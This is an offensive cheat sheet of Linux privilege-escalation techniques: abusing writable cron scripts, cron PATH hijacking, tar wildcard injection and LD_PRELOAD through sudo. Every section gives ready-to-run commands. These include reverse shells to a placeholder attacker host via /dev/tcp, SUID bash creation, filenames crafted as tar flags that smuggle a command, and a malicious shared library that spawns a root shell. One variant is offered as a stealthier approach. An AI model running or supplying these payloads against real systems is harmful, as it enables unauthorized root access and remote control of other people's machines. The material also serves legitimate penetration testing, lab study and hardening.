# Linux – Cron Jobs, PATH Hijacking & Wildcard Injection

### Writable Cron Script Exploitation [added: 2026-04]
- **Tags:** #CronJob #CronAbuse #WritableCron #PrivEsc #Linux #pspy #LinPEAS #ReverseShell #ScheduledTask
- **Trigger:** pspy reveals a cron job running as root that executes a script writable by the current user; or linpeas flags writable files in /etc/cron.*, /var/spool/cron/, or referenced by crontab entries
- **Prereq:** Low-privilege shell; write access to a script that is executed by a cron job running as a higher-privileged user (typically root)
- **Yields:** Code execution as the cron job's user (root if the cron runs as root); typically a reverse shell
- **Opsec:** Med
- **Context:** System cron jobs often execute maintenance or backup scripts. If the script file itself is world-writable or writable by the current user's group, injecting a reverse shell payload into it will execute as the cron's owner on the next scheduled run. Use pspy to monitor for cron executions if crontab -l shows nothing (system-level crons won't appear in user crontabs).
- **Payload/Method:**
```bash
# Step 1: Enumerate cron jobs and find writable scripts
crontab -l 2>/dev/null
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/ 2>/dev/null

# Check all referenced scripts for write permissions
grep -rh '/' /etc/crontab /etc/cron.d/ 2>/dev/null | awk '{for(i=6;i<=NF;i++) print $i}' | sort -u
# Then check each with: ls -la <script_path>

# Step 2: Monitor for hidden cron activity with pspy
# Upload pspy64 to target
./pspy64 -pf -i 1000
# Watch for processes spawning on schedule (UID=0 = root)

# Step 3: Inject reverse shell into writable cron script
echo 'bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1' >> /path/to/writable_cron_script.sh

# Or for a stealthier approach — append while preserving original functionality:
echo '' >> /path/to/writable_cron_script.sh
echo '/bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1" &' >> /path/to/writable_cron_script.sh

# Step 4: Start listener and wait for cron execution
nc -lvnp 9001
```

### PATH Variable Hijacking via Cron [added: 2026-04]
- **Tags:** #PATHHijack #CronPATH #PrivEsc #Linux #pspy #RelativePath #CommandHijack #EnvironmentAbuse
- **Trigger:** crontab or /etc/crontab shows a PATH variable that includes a writable directory; or a cron job executes a command without an absolute path (e.g., "backup.sh" instead of "/usr/local/bin/backup.sh")
- **Prereq:** Low-privilege shell; cron job that runs a command using a relative path; write access to a directory that appears in the cron's PATH before the real binary's location
- **Yields:** Code execution as the cron job's user (root); reverse shell or SUID binary creation
- **Opsec:** Med
- **Context:** The PATH variable in /etc/crontab dictates where cron looks for commands. If a cron job calls a binary by name only (no absolute path) and the PATH includes a writable directory like /home/user or /tmp before /usr/bin, creating a malicious binary with the same name in the writable directory will execute it as root on the next cron cycle.
- **Payload/Method:**
```bash
# Step 1: Check cron PATH
cat /etc/crontab
# Example output: PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# Note: /home/user is first in PATH and writable

# Step 2: Identify cron jobs using relative paths
grep -v '^#' /etc/crontab | grep -v '^$' | tail -n +2
# Example: * * * * * root backup.sh

# Step 3: Create malicious binary in writable PATH directory
cat > /home/user/backup.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x /home/user/backup.sh

# Step 4: Wait for cron to execute, then use the SUID bash
# (wait for next cron cycle)
/tmp/rootbash -p

# Alternative: reverse shell payload
cat > /home/user/backup.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1
EOF
chmod +x /home/user/backup.sh
```

### Tar Wildcard Injection [added: 2026-04]
- **Tags:** #WildcardInjection #TarExploit #Checkpoint #CronAbuse #PrivEsc #Linux #pspy #CommandInjection #GlobAbuse
- **Trigger:** pspy or crontab reveals a cron job running tar with a wildcard (e.g., `tar czf /backup/archive.tar.gz *` in a directory where the current user can write files)
- **Prereq:** Low-privilege shell; cron job (or any root process) that runs `tar` with a wildcard (`*`) in a directory where you can create files
- **Yields:** Arbitrary command execution as root via tar's --checkpoint-action feature
- **Opsec:** Med
- **Context:** When tar processes a wildcard, filenames are expanded by the shell before tar sees them. By creating files named like tar command-line flags (e.g., `--checkpoint=1` and `--checkpoint-action=exec=shell.sh`), tar interprets these filenames as arguments. This is a classic Unix wildcard injection that works because tar cannot distinguish filenames from flags when shell globbing expands them.
- **Payload/Method:**
```bash
# Step 1: Confirm the cron job and target directory
cat /etc/crontab
# Example: * * * * * root cd /home/user/backups && tar czf /backup/archive.tar.gz *

# Step 2: Create the reverse shell payload
cat > /home/user/backups/shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1
EOF
chmod +x /home/user/backups/shell.sh

# Step 3: Create the "flag" filenames that tar will interpret as arguments
cd /home/user/backups
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'

# Step 4: Start listener and wait
nc -lvnp 9001

# Alternative: create SUID bash instead of reverse shell
cat > /home/user/backups/shell.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
EOF
chmod +x /home/user/backups/shell.sh
# After cron fires: /tmp/rootbash -p
```

### LD_PRELOAD Privilege Escalation [added: 2026-04]
- **Tags:** #LD_PRELOAD #EnvKeep #SudoAbuse #SharedLibrary #PrivEsc #Linux #DynamicLinker #PreloadHijack #LinPEAS
- **Trigger:** `sudo -l` output shows `env_keep+=LD_PRELOAD` or `env_keep+=LD_LIBRARY_PATH` in the sudo configuration; linpeas highlights env_keep settings
- **Prereq:** Low-privilege shell; sudo access to run at least one command (even harmless ones like /usr/bin/find); sudo configured with `env_keep+=LD_PRELOAD`
- **Yields:** Root shell by preloading a malicious shared library into a sudo-executed process
- **Opsec:** Med
- **Context:** When sudoers is configured with `env_keep+=LD_PRELOAD`, the LD_PRELOAD environment variable survives the sudo transition. LD_PRELOAD forces the dynamic linker to load a specified shared library before all others. By compiling a .so that spawns a shell in its constructor function, then running any allowed sudo command with LD_PRELOAD pointing to it, the malicious library executes as root before the actual command runs.
- **Payload/Method:**
```bash
# Step 1: Confirm env_keep includes LD_PRELOAD
sudo -l
# Look for: env_keep+=LD_PRELOAD
# And any allowed command, e.g.: (root) NOPASSWD: /usr/bin/find

# Step 2: Compile malicious shared library
cat > /tmp/preload.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c

# Step 3: Run any allowed sudo command with LD_PRELOAD
sudo LD_PRELOAD=/tmp/preload.so /usr/bin/find

# Cleanup (after getting root shell)
rm /tmp/preload.c /tmp/preload.so
```
